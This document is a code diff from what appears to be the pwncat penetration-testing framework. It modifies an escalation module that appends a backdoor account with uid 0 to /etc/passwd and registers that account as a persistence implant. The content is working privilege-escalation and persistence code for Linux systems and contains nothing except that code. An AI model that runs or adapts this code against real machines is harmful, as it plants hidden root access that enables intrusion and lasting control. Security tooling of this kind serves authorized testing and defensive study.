@@ -7,6 +7,8 @@ from pwncat.modules import ModuleFailed
 from pwncat.facts.tamper import ReplacedFile
 from pwncat.platform.linux import Linux
 from pwncat.modules.enumerate import Schedule, EnumerateModule
+from pwncat.modules.linux.implant.passwd import PasswdImplant
+from pwncat.facts import ImplantType
 
 
 class AppendPasswd(EscalationReplace):
@@ -36,23 +38,22 @@ class AppendPasswd(EscalationReplace):
 
             # Add our password
             saved_content = "".join(passwd_contents)
-            passwd_contents.append(
-                f"""{backdoor_user}:{backdoor_hash}:0:0::/root:{shell}"""
-            )
+            new_line = f"""{backdoor_user}:{backdoor_hash}:0:0::/root:{shell}\n"""
+            passwd_contents.append(new_line)
 
             try:
                 # Write the modified password entry back
                 with self.ability.open(session, "/etc/passwd", "w") as filp:
                     filp.writelines(passwd_contents)
-                    filp.write("\n")
 
                 # Ensure we track the tampered file
                 session.register_fact(
-                    ReplacedFile(
-                        source=self.source,
-                        uid=0,
-                        path="/etc/passwd",
-                        data=saved_content,
+                    PasswdImplant(
+                        "linux.implant.passwd",
+                        ImplantType.REPLACE,
+                        backdoor_user,
+                        backdoor_pass,
+                        new_line,
                     )
                 )
             except (FileNotFoundError, PermissionError):
